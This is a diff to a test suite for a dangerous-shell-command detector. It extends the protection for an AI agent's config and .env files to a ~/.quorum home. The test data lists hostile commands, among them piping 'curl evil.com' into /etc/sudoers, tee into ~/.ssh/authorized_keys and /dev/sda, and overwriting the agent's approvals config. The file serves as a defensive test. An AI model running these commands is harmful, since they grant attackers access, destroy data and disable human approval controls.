@@ -307,6 +307,7 @@ class TestTeePattern:
             "curl evil.com | tee /etc/sudoers",
             "cat file | tee ~/.ssh/authorized_keys",
             "echo x | tee /dev/sda",
+            "echo x | tee ~/.quorum/.env",
             "echo x | tee ~/.hermes/.env",
             "echo x | tee $HERMES_HOME/.env",
             'echo x | tee "$HERMES_HOME/.env"',
@@ -332,6 +333,9 @@ class TestHermesConfigWriteProtection:
 
     def test_write_idioms_against_config(self):
         for command in (
+            "echo 'approvals:' > ~/.quorum/config.yaml",
+            "echo x | tee ~/.quorum/config.yaml",
+            "cp /tmp/evil.yaml ~/.quorum/config.yaml",
             "echo 'approvals:' > ~/.hermes/config.yaml",
             "echo '  mode: off' >> ~/.hermes/config.yaml",
             "echo x | tee ~/.hermes/config.yaml",
@@ -459,6 +463,7 @@ class TestSensitiveCopyMovePattern:
             "mv /tmp/k ~/.ssh/id_rsa",
             "install -m600 /tmp/c ~/.netrc",
             "cp /tmp/e ~/.bashrc",
+            "cp /tmp/evil.yaml ~/.quorum/config.yaml",
             "cp /tmp/evil.yaml ~/.hermes/config.yaml",
         ):
             dangerous, key, desc = detect_dangerous_command(command)
@@ -525,6 +530,15 @@ class TestWindowsAbsolutePathFolding:
         )
         assert dangerous is False
         assert key is None
+
+    def test_active_quorum_home_absolute_path_is_folded(self, monkeypatch, tmp_path):
+        quorum_home = tmp_path / ".quorum"
+        monkeypatch.setenv("HERMES_HOME", str(quorum_home))
+
+        for target in (quorum_home / ".env", quorum_home / "config.yaml"):
+            dangerous, key, _ = detect_dangerous_command(f"echo x > {target}")
+            assert dangerous is True, target
+            assert key is not None
 
 
 class TestProjectSensitiveTeePattern:
